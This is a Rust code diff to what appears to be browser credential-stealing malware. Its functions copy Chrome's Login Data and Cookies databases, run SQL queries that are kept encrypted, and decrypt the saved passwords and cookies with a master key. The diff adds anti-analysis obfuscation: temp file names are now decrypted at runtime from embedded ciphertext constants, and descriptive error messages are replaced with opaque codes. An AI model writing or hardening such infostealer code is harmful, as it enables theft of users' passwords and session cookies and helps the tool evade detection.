@@ -18,17 +18,19 @@ pub fn extract_passwords(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Va
     let login_data_name = aes_str(LOGIN_DATA_CT, &LOGIN_DATA_KEY, &LOGIN_DATA_NONCE);
     let login_data = profile_dir.join(&login_data_name);
 
-    let tmp = copy_db_to_temp(&login_data, "chrome_login_data_tmp.db")?;
+    use crate::xor::{TMPDB_LOGIN_CT, TMPDB_LOGIN_KEY, TMPDB_LOGIN_NONCE};
+    let tmp_name = aes_str(TMPDB_LOGIN_CT, &TMPDB_LOGIN_KEY, &TMPDB_LOGIN_NONCE);
+    let tmp = copy_db_to_temp(&login_data, &tmp_name)?;
     let conn = Connection::open_with_flags(
         &tmp,
         OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
     )
-    .map_err(|e| format!("open Login Data: {e}"))?;
+    .map_err(|_| "e20")?;
 
     let sql_pw = aes_str(SQL_PASSWORDS_CT, &SQL_PASSWORDS_KEY, &SQL_PASSWORDS_NONCE);
     let mut stmt = conn
         .prepare(&sql_pw)
-        .map_err(|e| format!("prepare: {e}"))?;
+        .map_err(|_| "e21")?;
 
     let rows: Vec<Value> = stmt
         .query_map([], |row| {
@@ -37,7 +39,7 @@ pub fn extract_passwords(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Va
             let enc_pass: Vec<u8> = row.get(2)?;
             Ok((url, username, enc_pass))
         })
-        .map_err(|e| format!("query: {e}"))?
+        .map_err(|_| "e22")?
         .filter_map(|r| r.ok())
         .map(|(url, username, enc_pass)| {
             let password = if enc_pass.is_empty() {
@@ -74,17 +76,19 @@ pub fn extract_cookies(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Valu
         }
     };
 
-    let tmp = copy_db_to_temp(&cookies_path, "chrome_cookies_tmp.db")?;
+    use crate::xor::{TMPDB_COOKIES_CT, TMPDB_COOKIES_KEY, TMPDB_COOKIES_NONCE};
+    let tmp_name_c = aes_str(TMPDB_COOKIES_CT, &TMPDB_COOKIES_KEY, &TMPDB_COOKIES_NONCE);
+    let tmp = copy_db_to_temp(&cookies_path, &tmp_name_c)?;
     let conn = Connection::open_with_flags(
         &tmp,
         OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
     )
-    .map_err(|e| format!("open Cookies: {e}"))?;
+    .map_err(|_| "e23")?;
 
     let sql_ck = aes_str(SQL_COOKIES_CT, &SQL_COOKIES_KEY, &SQL_COOKIES_NONCE);
     let mut stmt = conn
         .prepare(&sql_ck)
-        .map_err(|e| format!("prepare cookies: {e}"))?;
+        .map_err(|_| "e24")?;
 
     let rows: Vec<Value> = stmt
         .query_map([], |row| {
@@ -94,7 +98,7 @@ pub fn extract_cookies(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Valu
             let path: String = row.get(3)?;
             Ok((host, name, enc_val, path))
         })
-        .map_err(|e| format!("query cookies: {e}"))?
+        .map_err(|_| "e25")?
         .filter_map(|r| r.ok())
         .map(|(host, name, enc_val, path)| {
             let value = if enc_val.is_empty() {
@@ -128,7 +132,7 @@ fn copy_db_to_temp(src: &Path, tmp_name: &str) -> Result<std::path::PathBuf, Str
             Err(e) if attempt < 3 => {
                 std::thread::sleep(std::time::Duration::from_millis(500 * attempt));
             }
-            Err(e) => return Err(format!("copy {} to temp: {e}", src.display())),
+            Err(_) => return Err("e26".into()),
         }
     }
     unreachable!()
